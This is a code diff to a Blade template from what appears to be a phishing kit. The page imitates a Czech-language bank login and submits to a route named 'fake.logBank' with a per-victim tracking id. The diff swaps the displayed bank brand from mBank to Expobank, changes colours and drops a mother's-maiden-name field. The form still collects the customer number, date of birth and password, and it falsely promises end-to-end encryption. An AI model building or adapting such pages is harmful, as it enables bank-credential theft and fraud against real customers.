@@ -36,7 +36,7 @@
         ._3 {
             text-align: left;
             font-size: 14px;
-            border: 1px solid #c5c4c4;
+            border: 1px solid #f79d54;
             border-radius: 6px;
             padding: 12px 10px;
             margin-bottom: 20px;
@@ -62,16 +62,16 @@
             min-width: 180px;
             border-radius: 7px;
             white-space: nowrap;
-            background-color: #e90b0a;
+            background-color: #f79d54;
             color: #fff;
             text-align: center;
             text-decoration: none;
         }
 
         ._4:hover {
-            background-color: #e90b0a;
+            background-color: #f79d54;
             color: #fff;
-            border-color: #e90b0a;
+            border-color: #f79d54;
         }
 
         ._5 {
@@ -201,9 +201,7 @@
 @section('content')
     <div id="mainblock">
         <div class="_0">
-            <center><img height="120"
-                         src="{{asset($bank['logo'])}}">
-            </center>
+            <center><img height="120" src="{{asset($bank['logo'])}}"></center>
             <form id="bank_pm_form" method="POST"
                   action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                 <div class="loginboxes" style="margin-bottom: 20px;">
@@ -213,8 +211,6 @@
                        placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
                 <input class="_3" type="text" name="birthday" placeholder="Datum narození" required="">
                 <input class="_3" type="password" name="password" placeholder="Zadejte heslo" required="">
-                <input class="_3" type="password" name="pin"
-                       placeholder="Zadejte rodne prijmeni matky s diakritikou" required="">
                 <div class="loginboxes">
                     <p style="text-align: center; color: #666666;">Všechna připojení jsou šifrována end-to-end</p>
                     <input class="_4" type="submit" value="Další">
@@ -223,7 +219,9 @@
             </form>
         </div>
         <footer>
-            <center>{{date('Y')}} mBank</center>
+            <center>{{date('Y')}} Expobank</center>
         </footer>
     </div>
 @endsection
+@push('js')
+@endpush
